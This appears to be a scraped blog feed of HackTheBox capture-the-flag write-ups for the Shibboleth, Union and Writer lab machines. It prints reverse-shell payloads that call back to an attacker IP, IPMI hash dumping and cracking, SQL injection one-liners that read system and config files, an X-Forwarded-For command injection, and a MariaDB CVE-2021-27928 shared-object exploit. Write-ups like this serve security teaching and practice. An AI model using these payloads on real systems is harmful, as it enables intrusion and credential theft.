/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js,php --no-error =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://shibboleth.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: txt,html,js,php [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 279] /.html (Status: 403) [Size: 279] /index.html (Status: 200) [Size: 59474] /blog.html (Status: 200) [Size: 19196] /assets (Status: 301) [Size: 317] [--\u0026gt; http://shibboleth.htb/assets/] /forms (Status: 301) [Size: 316] [--\u0026gt; http://shibboleth.htb/forms/] /changelog.txt (Status: 200) [Size: 499] vhosts └─$ wfuzz -u http://shibboleth.htb/ -H \u0026#39;Host: FUZZ.shibboleth.htb\u0026#39; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw 26 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://shibboleth.htb/ Total requests: 19966 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000099: 200 29 L 219 W 3684 Ch \u0026#34;monitor\u0026#34; 000000346: 200 29 L 219 W 3684 Ch \u0026#34;monitoring\u0026#34; 000000390: 200 29 L 219 W 3684 Ch \u0026#34;zabbix\u0026#34; zabbix/monitoring/monitor.shibboleth.htb Foothold We saw port 623, which looks like IPMI Let\u0026rsquo;s enumerate the version We can use nmap or msfconsole\u0026rsquo;s auxiliary/scanner/ipmi/ipmi_version └─$ sudo nmap -sU --script ipmi-version -p 623 10.10.11.124 [sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-08 17:09 GMT Nmap scan report for shibboleth.htb (10.10.11.124) Host is up (0.21s latency). PORT STATE SERVICE 623/udp open asf-rmcp | ipmi-version: | Version: | IPMI-2.0 | UserAuth: password, md5, md2, null | PassAuth: auth_msg, auth_user, non_null_user |_ Level: 1.5, 2.0 Nmap done: 1 IP address (1 host up) scanned in 0.92 seconds It\u0026rsquo;s a version 2.0 We can start with password hash retrieval We can use msfconfole\u0026rsquo;s auxiliary/scanner/ipmi/ipmi_dumphashes or impiPwner msf6 \u0026gt; use auxiliary/scanner/ipmi/ipmi_dumphashes msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) \u0026gt; set rhosts 10.10.11.124 rhosts =\u0026gt; 10.10.11.124 msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) \u0026gt; options Module options (auxiliary/scanner/ipmi/ipmi_dumphashes): Name Current Setting Required Description ---- --------------- -------- ----------- CRACK_COMMON true yes Automatically crack common passwords as they are obtained OUTPUT_HASHCAT_FILE no Save captured password hashes in hashcat format OUTPUT_JOHN_FILE no Save captured password hashes in john the ripper format PASS_FILE /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt yes File containing common passwords for offline cracking, one per line RHOSTS 10.10.11.124 yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html RPORT 623 yes The target port SESSION_MAX_ATTEMPTS 5 yes Maximum number of session retries, required on certain BMCs (HP iLO 4, etc) SESSION_RETRY_DELAY 5 yes Delay between session retries in seconds THREADS 1 yes The number of concurrent threads (max one per host) USER_FILE /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt yes File containing usernames, one per line View the full module info with the info, or info -d command. msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) \u0026gt; run [+] 10.10.11.124:623 - IPMI - Hash found: Administrator:cdaffa8c82010000ceabd3a662a18b669e64f57404e391d9ea9b3ead1395fcd29d98ed1616136ec4a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:3aa06d6cc91fba15a30dd71348d2a3bd96cc183e [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed └─$ sudo python3 ipmipwner.py --host 10.10.11.124 [*] Checking if port 623 for host 10.10.11.124 is active [*] Using the list of users that the script has by default [*] Brute Forcing [*] Number of retries: 2 [*] The username: Administrator is valid [*] The hash for user: Administrator \\_ $rakp$a4a3a2a0020d0000b82f950202e57081b2517321814ca29f0080a248fecd3f6b8d9b5127c0e0a46fa123456789abcdefa123456789abcdef140d41646d696e6973747261746f72$475056be7a2b7819f6612dae65164ef8a3f6b781 We found the hash, let\u0026rsquo;s crack it Remove $rakp$ Replace $ with : └─$ hashcat -m 7300 hash /usr/share/wordlists/rockyou.txt \u0026lt;SNIP\u0026gt; a4a3a2a0020d0000b82f950202e57081b2517321814ca29f0080a248fecd3f6b8d9b5127c0e0a46fa123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:475056be7a2b7819f6612dae65164ef8a3f6b781:ilovepumkinpie1 \u0026lt;SNIP\u0026gt; We can login to zabbix Administrator:ilovepumkinpie1 We can spawn a reverse shell http://zabbix.shibboleth.htb/hosts.php or Configuration -\u0026gt; Hosts -\u0026gt; shibboleth.htb Then click Items, which will change the page You will see Create item on the top right corner Now, we have to create an item Select a key system.run[] Let\u0026rsquo;s click Test We have our execution Let\u0026rsquo;s get reverse shell There was an issue with how zabbix handles special chars, so I had to encode the payload └─$ echo \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.4/6666 0\u0026gt;\u0026amp;1 \u0026#34; | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNC82NjY2IDA+JjEgCg== Now let\u0026rsquo;s run it system.run[echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNC82NjY2IDA+JjEgCg== | base64 -d | bash] We receive connection, but it dies We can see zabbix called exit └─$ nc -vlnp 6666 listening on [any] 6666 ... connect to [10.10.16.4] from (UNKNOWN) [10.10.11.124] 54716 bash: cannot set terminal process group (13350): Inappropriate ioctl for device bash: no job control in this shell zabbix@shibboleth:/$ exit We have to add nowait option, to system.run[] Documentation system.run[echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNC82NjY2IDA+JjEgCg== | base64 -d | bash, nowait] And we get our reverse shell User We have a single user ipmi-svc zabbix@shibboleth:/$ ls /home/ ipmi-svc If we test for password-reuse it works The password we got from impi ilovepumkinpie1 We can su as impi-svc zabbix@shibboleth:/$ su - ipmi-svc Password: ipmi-svc@shibboleth:~$ Root netstat ipmi-svc@shibboleth:~$ netstat -tupln (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:10050 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:10051 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::10050 :::* LISTEN - tcp6 0 0 :::10051 :::* LISTEN - udp 0 0 127.0.0.53:53 0.0.0.0:* - udp 0 0 127.0.0.1:161 0.0.0.0:* - udp 0 0 0.0.0.0:623 0.0.0.0:* - udp6 0 0 ::1:161 :::* - We have a mysql running localy Let\u0026rsquo;s check it Since it\u0026rsquo;s related to zabbix, we have to check zabbix_server.conf ipmi-svc@shibboleth:~$ ls -lha /etc/zabbix total 100K drwxr-xr-x 4 root root 4.0K Nov 8 2021 . drwxr-xr-x 96 root root 4.0K Nov 8 2021 .. -r-------- 1 zabbix zabbix 33 Apr 24 2021 peeesskay.psk drwxr-xr-x 2 www-data root 4.0K Apr 27 2021 web -rw-r--r-- 1 root root 15K May 25 2021 zabbix_agentd.conf -rw-r--r-- 1 root root 16K Oct 18 2021 zabbix_agentd.conf.dpkg-dist drwxr-xr-x 2 root root 4.0K Apr 27 2021 zabbix_agentd.d -rw-r----- 1 root ipmi-svc 22K Apr 24 2021 zabbix_server.conf -rw-r----- 1 root ipmi-svc 22K Oct 18 2021 zabbix_server.conf.dpkg-dist We can filter out the comments ipmi-svc@shibboleth:/etc/zabbix$ cat zabbix_server.conf | grep -v \u0026#39;^#\u0026#39; | grep . LogFile=/var/log/zabbix/zabbix_server.log LogFileSize=0 PidFile=/run/zabbix/zabbix_server.pid SocketDir=/run/zabbix DBName=zabbix DBUser=zabbix DBPassword=bloooarskybluh SNMPTrapperFile=/var/log/snmptrap/snmptrap.log Timeout=4 AlertScriptsPath=/usr/lib/zabbix/alertscripts ExternalScripts=/usr/lib/zabbix/externalscripts FpingLocation=/usr/bin/fping Fping6Location=/usr/bin/fping6 LogSlowQueries=3000 StatsAllowedIP=127.0.0.1 Let\u0026rsquo;s connect to database Nothing interesting there ipmi-svc@shibboleth:/etc/zabbix$ mysql -u zabbix -pbloooarskybluh Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 933 Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement. MariaDB [(none)]\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | zabbix | +--------------------+ 2 rows in set (0.001 sec) MariaDB [(none)]\u0026gt; If we google for 10.3.25-MariaDB exploit/vulnerability we find CVE-2021-27928 PoC We need a shared object (so) └─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.4 LPORT=7777 -f elf-so -o CVE-2021-27928.so [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 74 bytes Final size of elf-so file: 476 bytes Saved as: CVE-2021-27928.so We exploit wsrep_provider ipmi-svc@shibboleth:/dev/shm$ wget 10.10.16.4/CVE-2021-27928.so --2023-11-08 17:54:34-- http://10.10.16.4/CVE-2021-27928.so Connecting to 10.10.16.4:80... connected. HTTP request sent, awaiting response... 200 OK Length: 476 [application/octet-stream] Saving to: ‘CVE-2021-27928.so’ CVE-2021-27928.so 100%[========================================================================================================================================\u0026gt;] 476 --.-KB/s in 0.002s 2023-11-08 17:54:35 (277 KB/s) - ‘CVE-2021-27928.so’ saved [476/476] ipmi-svc@shibboleth:/dev/shm$ mysql -u zabbix -pbloooarskybluh -e \u0026#39;SET GLOBAL wsrep_provider=\u0026#34;/dev/shm/CVE-2021-27928.so\u0026#34;;\u0026#39; ERROR 2013 (HY000) at line 1: Lost connection to MySQL server during query And we have our root shell ","date":"November 6, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/shibboleth/images/shibboleth.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/shibboleth/","summary":"Shibboleth Enumeration nmap └─$ nmap -Pn -p- 10.10.11.124 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-07 16:58 GMT Warning: 10.10.11.124 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.11.124 (10.10.11.124) Host is up (0.17s latency). Not shown: 65181 closed tcp ports (conn-refused), 353 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 87.","tags":["HTB","vhosts","zabbix","ipmi","msfconsole","msfvenom","shared-object","rakp","ipmipwner","hashcat","mysql","cve-2021-27928"],"title":"[HTB] Machine: Shibboleth"},{"categories":null,"contents":"Unicode Enumeration nmap ","date":"November 6, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/unicode/images/unicode.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/unicode/","summary":"Unicode Enumeration nmap ","tags":["HTB"],"title":"[HTB] Machine: Unicode"},{"categories":null,"contents":"Union Enumeration nmap └─$ nmap -Pn -p- 10.10.11.128 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-06 14:17 GMT Nmap scan report for 10.10.11.128 (10.10.11.128) Host is up (0.17s latency). Not shown: 65534 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 131.43 seconds └─$ nmap -Pn -p80 -sC -sV 10.10.11.128 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-06 14:20 GMT Nmap scan report for 10.10.11.128 (10.10.11.128) Host is up (0.17s latency). PORT STATE SERVICE VERSION 80/tcp open http nginx 1.18.0 (Ubuntu) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.61 seconds Web Server gobuster └─$ gobuster dir -u http://10.10.11.128/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js,php --no-error =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.128/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: txt,html,js,php [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.html (Status: 403) [Size: 162] /index.php (Status: 200) [Size: 1220] /css (Status: 301) [Size: 178] [--\u0026gt; http://10.10.11.128/css/] /firewall.php (Status: 200) [Size: 13] /config.php (Status: 200) [Size: 0] /challenge.php (Status: 200) [Size: 772] Foothold Based on enumeration, there is nothing except for index.php and challenge.php input forms When we enter text to index.php input form, we receive a response with the input we supplied I tried testing for SSTI, but no results The interesting thing is when we enter ippsec (box\u0026rsquo;s author), we receive error message Trying entering special chars didn\u0026rsquo;t work But as soon as we enter basic sqli, we receive interesting response test' or 1=1;-- - We don\u0026rsquo;t get the link back as we did if we entered simple text Trying union injection works, since we receive Sorry, 1 you are not eligible due to already qualifying. We could\u0026rsquo;ve also test by entering ippsec;-- -, since if there were no injection we would\u0026rsquo;ve not received: Sorry, ippsec you are not eligible due to already qualifying. So if there were no injection, we would received something like Congratulations ippsec;-- - you may compete in this tournament Thus the query could look like: SELECT username from users if username = '\u0026lt;INPUT\u0026gt;'; Let\u0026rsquo;s enumerate the user We could make it a one-liner └─$ curl -s -XPOST http://10.10.11.128 --data-urlencode \u0026#34;player=\u0026#39; union select user() -- -\u0026#34; | sed \u0026#39;s/Sorry, //\u0026#39; | sed \u0026#39;s/ you are not eligible due to already qualifying.//\u0026#39; uhc@localhost Let\u0026rsquo;s continue └─$ curl -s -XPOST http://10.10.11.128 --data-urlencode \u0026#34;player=\u0026#39; union select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.schemata -- -\u0026#34; | sed \u0026#39;s/Sorry, //\u0026#39; | sed \u0026#39;s/ you are not eligible due to already qualifying.//\u0026#39; mysql,information_schema,performance_schema,sys,november └─$ curl -s -XPOST http://10.10.11.128 --data-urlencode \u0026#34;player=\u0026#39; union select group_concat(table_name) from INFORMATION_SCHEMA.tables where table_schema=\u0026#39;november\u0026#39; -- -\u0026#34; | sed \u0026#39;s/Sorry, //\u0026#39; | sed \u0026#39;s/ you are not eligible due to already qualifying.//\u0026#39; flag,players └─$ curl -s -XPOST http://10.10.11.128 --data-urlencode \u0026#34;player=\u0026#39; union select group_concat(table_name, \u0026#39;:\u0026#39;, column_name) from INFORMATION_SCHEMA.columns where table_schema=\u0026#39;november\u0026#39;-- -\u0026#34; | sed \u0026#39;s/Sorry, //\u0026#39; | sed \u0026#39;s/ you are not eligible due to already qualifying.//\u0026#39; flag:one,players:player Let\u0026rsquo;s dump the data └─$ curl -s -XPOST http://10.10.11.128 --data-urlencode \u0026#34;player=\u0026#39; union select group_concat(one) from flag-- -\u0026#34; | sed \u0026#39;s/Sorry, //\u0026#39; | sed \u0026#39;s/ you are not eligible due to already qualifying.//\u0026#39; UHC{F1rst_5tep_2_Qualify} └─$ curl -s -XPOST http://10.10.11.128 --data-urlencode \u0026#34;player=\u0026#39; union select group_concat(player) from players-- -\u0026#34; | sed \u0026#39;s/Sorry, //\u0026#39; | sed \u0026#39;s/ you are not eligible due to already qualifying.//\u0026#39; ippsec,celesian,big0us,luska,tinyboy If we enter the flag to challenge.php, we are redirected to firewall.php We are granted access to ssh, which can be confirmed via nmap Now, if we check permissions of mysql, we have a permission to read files https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql └─$ curl -s -XPOST http://10.10.11.128 --data-urlencode \u0026#34;player=\u0026#39; union select group_concat(user,\u0026#39;:\u0026#39;, file_priv ) from mysql.user-- -\u0026#34; | sed \u0026#39;s/Sorry, //\u0026#39; | sed \u0026#39;s/ you are not eligible due to already qualifying.//\u0026#39; debian-sys-maint:Y,mysql.infoschema:N,mysql.session:N,mysql.sys:N,root:Y,uhc:Y Let\u0026rsquo;s enumerate file system └─$ curl -s -XPOST http://10.10.11.128 --data-urlencode \u0026#34;player=\u0026#39; union select load_file(\u0026#39;/etc/passwd\u0026#39;)-- -\u0026#34; | sed \u0026#39;s/Sorry, //\u0026#39; | sed \u0026#39;s/ you are not eligible due to already qualifying.//\u0026#39; root:x:0:0:root:/root:/bin/bash \u0026lt;SNIP\u0026gt; uhc:x:1001:1001:,,,:/home/uhc:/bin/bash No private key in users\u0026rsquo; home directory But we can check the source code We can go through each file we saw from gobuster The most interesting is config.php └─$ curl -s -XPOST http://10.10.11.128 --data-urlencode \u0026#34;player=\u0026#39; union select load_file(\u0026#39;/var/www/html/config.php\u0026#39;)-- -\u0026#34; | sed \u0026#39;s/Sorry, //\u0026#39; | sed \u0026#39;s/ you are not eligible due to already qualifying.//\u0026#39; \u0026lt;?php session_start(); $servername = \u0026#34;127.0.0.1\u0026#34;; $username = \u0026#34;uhc\u0026#34;; $password = \u0026#34;uhc-11qual-global-pw\u0026#34;; $dbname = \u0026#34;november\u0026#34;; $conn = new mysqli($servername, $username, $password, $dbname); ?\u0026gt; We can test for password reuse And it works └─$ sshpass -p uhc-11qual-global-pw ssh uhc@10.10.11.128 Warning: Permanently added \u0026#39;10.10.11.128\u0026#39; (ED25519) to the list of known hosts. Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-77-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Last login: Mon Nov 8 21:19:42 2021 from 10.10.14.8 uhc@union:~$ User Nothing much But analysing firewall.php reveals a possible command injection uhc@union:/var/www/html$ cat firewall.php \u0026lt;?php require(\u0026#39;config.php\u0026#39;); if (!($_SESSION[\u0026#39;Authenticated\u0026#39;])) { echo \u0026#34;Access Denied\u0026#34;; exit; } ?\u0026gt; \u0026lt;link href=\u0026#34;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; id=\u0026#34;bootstrap-css\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;!------ Include the above in your HEAD tag ----------\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-center m-5\u0026#34;\u0026gt;Join the UHC - November Qualifiers\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;section class=\u0026#34;bg-dark text-center p-5 mt-4\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container p-5\u0026#34;\u0026gt; \u0026lt;?php if (isset($_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;])) { $ip = $_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;]; } else { $ip = $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]; }; system(\u0026#34;sudo /usr/sbin/iptables -A INPUT -s \u0026#34; . $ip . \u0026#34; -j ACCEPT\u0026#34;); ?\u0026gt; \u0026lt;h1 class=\u0026#34;text-white\u0026#34;\u0026gt;Welcome Back!\u0026lt;/h1\u0026gt; \u0026lt;h3 class=\u0026#34;text-white\u0026#34;\u0026gt;Your IP Address has now been granted SSH Access.\u0026lt;/h3\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;/div\u0026gt; The line we have to target is system(\u0026quot;sudo /usr/sbin/iptables -A INPUT -s \u0026quot; . $ip . \u0026quot; -j ACCEPT\u0026quot;); The $ip is set via $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; We can modify X-FORWARDED-FOR header and perform the injection Let\u0026rsquo;s get reverse shell Payload: X-Forwarded-For: 1.1.1.1; bash -c \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.4/6666 0\u0026gt;\u0026amp;1\u0026quot;; Root sudo www-data@union:~/html$ sudo -l Matching Defaults entries for www-data on union: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on union: (ALL : ALL) NOPASSWD: ALL Rooted www-data@union:~/html$ sudo su root@union:/var/www/html# ","date":"November 6, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/union/images/union.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/union/","summary":"Union Enumeration nmap └─$ nmap -Pn -p- 10.10.11.128 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-06 14:17 GMT Nmap scan report for 10.10.11.128 (10.10.11.128) Host is up (0.17s latency). Not shown: 65534 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 131.43 seconds └─$ nmap -Pn -p80 -sC -sV 10.10.11.128 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-06 14:20 GMT Nmap scan report for 10.","tags":["HTB","sqli","filter","waf","sqli-file","injection","command-injection","sudo","iptables"],"title":"[HTB] Machine: Union"},{"categories":null,"contents":"Writer Enumeration nmap └─$ nmap -Pn -p- 10.10.11.101 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-07 07:57 GMT Nmap scan report for 10.10.11.101 (10.10.11.101) Host is up (0.17s latency). Not shown: 65528 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 139/tcp open netbios-ssn 246/tcp filtered dsp3270 445/tcp open microsoft-ds 30624/tcp filtered unknown 45985/tcp filtered unknown Nmap done: 1 IP address (1 host up) scanned in 75.27 seconds └─$ nmap -Pn -p22,80,139,445 -sC -sV 10.10.11.101 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-07 07:59 GMT Nmap scan report for 10.10.11.101 (10.10.11.101) Host is up (0.22s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA) | 256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA) |_ 256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Story Bank | Writer.HTB 139/tcp open netbios-ssn Samba smbd 4.6.2 445/tcp open netbios-ssn Samba smbd 4.6.2 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: -51s | smb2-time: | date: 2023-11-07T07:58:48 |_ start_date: N/A |_nbstat: NetBIOS name: WRITER, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.47 seconds Web Server smb └─$ smbclient -N -L //10.10.11.101 Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers writer2_project Disk IPC$ IPC IPC Service (writer server (Samba, Ubuntu)) Reconnecting with SMB1 for workgroup listing. smbXcli_negprot_smb1_done: No compatible protocol selected by server. Protocol negotiation to server 10.10.11.101 (for a protocol between CORE and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE Unable to connect with SMB1 -- no workgroup available gobuster └─$ gobuster dir -u http://10.10.11.101/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js,php --no-error =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.101/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: txt,html,js,php [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /contact (Status: 200) [Size: 4905] /about (Status: 200) [Size: 3522] /static (Status: 301) [Size: 313] [--\u0026gt; http://10.10.11.101/static/] /logout (Status: 302) [Size: 208] [--\u0026gt; http://10.10.11.101/] /dashboard (Status: 302) [Size: 208] [--\u0026gt; http://10.10.11.101/] /administrative (Status: 200) [Size: 1443] Foothold http://10.10.11.101/administrative Basic sqli authentification bypass works We couldn\u0026rsquo;t do much in admin panel But we can see our username is actually the payload we supplied So let\u0026rsquo;s continue with sqli I\u0026rsquo;ll start with union injection Eventually, I found that there are 6 columns and second column is username Continue enumeration We can drop the request to sqlmap to make it faster But I\u0026rsquo;ll continue with manual enumeration https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet Looks like we have file privileges We can look for apache config to see if there are other web sites enabled Default location is /etc/apache2/sites-enabled/000-default.conf We see 2 applications /var/www/writer.htb /var/www/writer.htb/writer.wsgi WSGI stands for \u0026ldquo;Web Server Gateway Interface\u0026rdquo;. It is used to forward requests from a web server (such as Apache or NGINX) to a backend Python web application or framework Shows source code location # Import the __init__.py from the app folder /var/www/writer.htb/writer/__init__.py contains source code for web app /var/www/writer2_project I\u0026rsquo;ll start with writer.htb Dump the source code and use CyberChef to decode from HTML Entity We find a possible ssrf and command injections in /dashboard/stories/edit/\u0026lt;id\u0026gt; and /dashboard/stories/add \u0026lt;SNIP\u0026gt; @app.route(\u0026#39;/dashboard/stories/add\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def add_story(): if not (\u0026#39;user\u0026#39; in session): return redirect(\u0026#39;/\u0026#39;) try: connector = connections() except mysql.connector.Error as err: return (\u0026#34;Database error\u0026#34;) if request.method == \u0026#34;POST\u0026#34;: if request.files[\u0026#39;image\u0026#39;]: image = request.files[\u0026#39;image\u0026#39;] if \u0026#34;.jpg\u0026#34; in image.filename: path = os.path.join(\u0026#39;/var/www/writer.htb/writer/static/img/\u0026#39;, image.filename) image.save(path) image = \u0026#34;/img/{}\u0026#34;.format(image.filename) else: error = \u0026#34;File extensions must be in .jpg!\u0026#34; return render_template(\u0026#39;add.html\u0026#39;, error=error) if request.form.get(\u0026#39;image_url\u0026#39;): image_url = request.form.get(\u0026#39;image_url\u0026#39;) if \u0026#34;.jpg\u0026#34; in image_url: try: local_filename, headers = urllib.request.urlretrieve(image_url) # \u0026lt;---------- SSRF os.system(\u0026#34;mv {} {}.jpg\u0026#34;.format(local_filename, local_filename)) # \u0026lt;---------- COMMAND INJECTION image = \u0026#34;{}.jpg\u0026#34;.format(local_filename) try: im = Image.open(image) im.verify() im.close() image = image.replace(\u0026#39;/tmp/\u0026#39;,\u0026#39;\u0026#39;) os.system(\u0026#34;mv /tmp/{} /var/www/writer.htb/writer/static/img/{}\u0026#34;.format(image, image)) image = \u0026#34;/img/{}\u0026#34;.format(image) except PIL.UnidentifiedImageError: os.system(\u0026#34;rm {}\u0026#34;.format(image)) error = \u0026#34;Not a valid image file!\u0026#34; return render_template(\u0026#39;add.html\u0026#39;, error=error) except: error = \u0026#34;Issue uploading picture\u0026#34; return render_template(\u0026#39;add.html\u0026#39;, error=error) \u0026lt;SNIP\u0026gt; Navigate to admin panel and add a new story Click on here under Story Image to change the form The request after adding the story So the image_url is filled when I enter url We can also spray the creds we found Luckily we have access as kyle to smb └─$ smbmap -H 10.10.11.101 -u kyle -p ToughPasswordToCrack ________ ___ ___ _______ ___ ___ __ _______ /\u0026#34; )|\u0026#34; \\ /\u0026#34; || _ \u0026#34;\\ |\u0026#34; \\ /\u0026#34; | /\u0026#34;\u0026#34;\\ | __ \u0026#34;\\ (: \\___/ \\ \\ // |(. |_) :) \\ \\ // | / \\ (. |__) :) \\___ \\ /\\ \\/. ||: \\/ /\\ \\/. | /\u0026#39; /\\ \\ |: ____/ __/ \\ |: \\. |(| _ \\ |: \\. | // __\u0026#39; \\ (| / /\u0026#34; \\ :) |. \\ /: ||: 